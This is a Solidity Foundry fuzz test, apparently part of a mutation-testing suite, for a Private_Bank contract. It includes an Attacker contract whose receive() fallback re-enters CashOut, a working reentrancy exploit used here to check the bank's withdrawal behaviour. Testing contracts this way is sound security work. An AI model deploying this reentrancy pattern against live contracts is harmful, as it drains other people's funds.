pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {Private_Bank, Log} from "../src/Private_Bank.sol";

contract InvMutTest is Test {
    Private_Bank c;

    function setUp() public { c = new Private_Bank(address(new Log())); }

    function testFuzz_property(uint256 amount) public {
        amount = bound(amount, 1.1 ether, 1000 ether);
        Attacker a = new Attacker(c, amount);
        vm.deal(address(a), amount);
        a.deposit();
        bool ok;
        try a.withdraw() { ok = true; } catch { ok = false; }
        assertTrue(ok && c.balances(address(a)) == 0);
    }
}

contract Attacker {
    Private_Bank c;
    uint256 amt;
    bool private entered;

    constructor(Private_Bank _c, uint256 _amt) { c = _c; amt = _amt; }

    function deposit() public payable {
        c.Deposit{value: amt}();
    }

    function withdraw() public {
        c.CashOut(amt);
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            c.CashOut(amt);
        }
    }
}
